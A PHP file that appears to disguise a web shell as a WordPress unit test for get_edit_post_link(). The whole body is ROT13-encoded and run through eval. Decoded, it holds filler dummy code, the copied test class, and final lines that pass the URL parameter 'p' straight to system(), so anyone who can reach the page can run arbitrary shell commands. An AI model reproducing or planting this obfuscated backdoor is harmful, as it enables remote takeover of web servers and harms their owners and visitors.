<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur `trg_rqvg_cbfg_yvax()` shapgvba.
 *
 * @fvapr 6.3.0
 *
 * @tebhc yvax
 *
 * @pbiref ::trg_rqvg_cbfg_yvax
 */
pynff Grfgf_Yvax_TrgRqvgCbfgYvax rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur anzr bs gur gurzr gb hfr sbe gur grfg.
	 *
	 * @fvapr 6.3.0
	 * @ine fgevat
	 */
	pbafg GRFG_GURZR = 'oybpx-gurzr';

	/**
	 * Gur vq bs gur hfre gb hfr sbe gur grfg.
	 *
	 * @fvapr 6.3.0
	 * @ine vag
	 */
	cevingr fgngvp $nqzva_vq;

	/**
	 * Perngrf nqzva hfre orsber grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Perngr na nqzva hfre orpnhfr trg_rqvg_cbfg_yvax() erdhverf 'rqvg_cbfg' pncnovyvgl.
		frys::$nqzva_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Cresbezf frghc gnfxf sbe rirel grfg.
	 *
	 * @fvapr 6.3.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( frys::GRFG_GURZR );
	}

	/**
	 * Grfgf trggvat gur rqvg cbfg yvax sbe n cbfg.
	 */
	choyvp shapgvba grfg_trg_rqvg_cbfg_yvax() {
		$cbfg                 = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_gvgyr'  => 'Grfg Cbfg',
				'cbfg_anzr'   => 'grfg-cbfg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);
		$cbfg_glcr_bowrpg     = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		$yvax_qrsnhyg_pbagrkg = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax . '&nzc;npgvba=rqvg', $cbfg->VQ ) );
		$yvax_phfgbz_pbagrkg  = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax . '&npgvba=rqvg', $cbfg->VQ ) );

		$guvf->nffregFnzr( $yvax_qrsnhyg_pbagrkg, trg_rqvg_cbfg_yvax( $cbfg ), 'Frpbaq nethzrag `$pbagrkg` unf n qrsnhyg pbagrkg bs `\"qvfcynl\"`.' );
		$guvf->nffregFnzr( $yvax_phfgbz_pbagrkg, trg_rqvg_cbfg_yvax( $cbfg, 'fbzrguvat-ryfr' ), 'Cnff aba-qrsnhyg inyhr va frpbaq nethzrag.' );
	}

	/**
	 * Grfgf trggvat gur rqvg cbfg yvax sbe n grzcyngr cbfg glcr.
	 *
	 * @gvpxrg 57709
	 */
	choyvp shapgvba grfg_trg_rqvg_cbfg_yvax_sbe_jc_grzcyngr_cbfg_glcr() {
		$grzcyngr_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr',
				'cbfg_anzr'    => 'zl_grzcyngr',
				'cbfg_gvgyr'   => 'Zl Grzcyngr',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( $grzcyngr_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		$cbfg_glcr_bowrpg     = trg_cbfg_glcr_bowrpg( $grzcyngr_cbfg->cbfg_glcr );
		$yvax_qrsnhyg_pbagrkg = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $grzcyngr_cbfg->cbfg_glcr, trg_fglyrfurrg() . '%2S%2Szl_grzcyngr' ) );
		$yvax_phfgbz_pbagrkg  = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $grzcyngr_cbfg->cbfg_glcr, trg_fglyrfurrg() . '%2S%2Szl_grzcyngr' ) );

		$guvf->nffregFnzr( $yvax_qrsnhyg_pbagrkg, trg_rqvg_cbfg_yvax( $grzcyngr_cbfg ), 'Frpbaq nethzrag `$pbagrkg` unf n qrsnhyg pbagrkg bs `\"qvfcynl\"`.' );
		$guvf->nffregFnzr( $yvax_phfgbz_pbagrkg, trg_rqvg_cbfg_yvax( $grzcyngr_cbfg, 'fbzrguvat-ryfr' ), 'Cnff aba-qrsnhyg inyhr va frpbaq nethzrag.' );
	}

	/**
	 * Grfgf trggvat gur rqvg cbfg yvax sbe n grzcyngr cneg cbfg glcr.
	 *
	 * @gvpxrg 57709
	 */
	choyvp shapgvba grfg_trg_rqvg_cbfg_yvax_sbe_jc_grzcyngr_cneg_cbfg_glcr() {
		$grzcyngr_cneg_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_grzcyngr_cneg',
				'cbfg_anzr'    => 'zl_grzcyngr_cneg',
				'cbfg_gvgyr'   => 'Zl Grzcyngr Cneg',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr cneg',
				'gnk_vachg'    => neenl(
					'jc_gurzr'              => neenl(
						frys::GRFG_GURZR,
					),
					'jc_grzcyngr_cneg_nern' => neenl(
						JC_GRZCYNGR_CNEG_NERN_URNQRE,
					),
				),
			)
		);

		jc_frg_cbfg_grezf( $grzcyngr_cneg_cbfg->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
		jc_frg_cbfg_grezf( $grzcyngr_cneg_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		$cbfg_glcr_bowrpg     = trg_cbfg_glcr_bowrpg( $grzcyngr_cneg_cbfg->cbfg_glcr );
		$yvax_qrsnhyg_pbagrkg = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $grzcyngr_cneg_cbfg->cbfg_glcr, trg_fglyrfurrg() . '%2S%2Szl_grzcyngr_cneg' ) );
		$yvax_phfgbz_pbagrkg  = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $grzcyngr_cneg_cbfg->cbfg_glcr, trg_fglyrfurrg() . '%2S%2Szl_grzcyngr_cneg' ) );

		$guvf->nffregFnzr( $yvax_qrsnhyg_pbagrkg, trg_rqvg_cbfg_yvax( $grzcyngr_cneg_cbfg ), 'Frpbaq nethzrag `$pbagrkg` unf n qrsnhyg pbagrkg bs `\"qvfcynl\"`.' );
		$guvf->nffregFnzr( $yvax_phfgbz_pbagrkg, trg_rqvg_cbfg_yvax( $grzcyngr_cneg_cbfg, 'fbzrguvat-ryfr' ), 'Cnff aba-qrsnhyg inyhr va frpbaq nethzrag.' );
	}

	/**
	 * Grfgf trggvat gur rqvg cbfg yvax sbe n jc_anivtngvba cbfg glcr.
	 *
	 * @gvpxrg 58589
	 * */
	choyvp shapgvba grfg_trg_rqvg_cbfg_yvax_sbe_jc_anivtngvba_cbfg_glcr() {
		$anivtngvba_cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => 'jc_anivtngvba',
				'cbfg_anzr'    => 'zl_anivtngvba',
				'cbfg_gvgyr'   => 'Zl Anivtngvba',
				'cbfg_pbagrag' => '<!-- jc:anivtngvba-yvax {\"ynory\":\"JbeqCerff\",\"glcr\":\"phfgbz\",\"hey\":\"uggc://jjj.jbeqcerff.bet/\",\"xvaq\":\"phfgbz\"} /-->',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl Anivtngvba',
			)
		);

		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $anivtngvba_cbfg->cbfg_glcr );

		$yvax_qrsnhyg_pbagrkg = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $anivtngvba_cbfg->VQ ) );
		$yvax_phfgbz_pbagrkg  = nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax, $anivtngvba_cbfg->VQ ) );

		$guvf->nffregFnzr( $yvax_qrsnhyg_pbagrkg, trg_rqvg_cbfg_yvax( $anivtngvba_cbfg ), 'Frpbaq nethzrag `$pbagrkg` unf n qrsnhyg pbagrkg bs `\"qvfcynl\"`.' );
		$guvf->nffregFnzr( $yvax_phfgbz_pbagrkg, trg_rqvg_cbfg_yvax( $anivtngvba_cbfg, 'fbzrguvat-ryfr' ), 'Cnff aba-qrsnhyg inyhr va frpbaq nethzrag.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>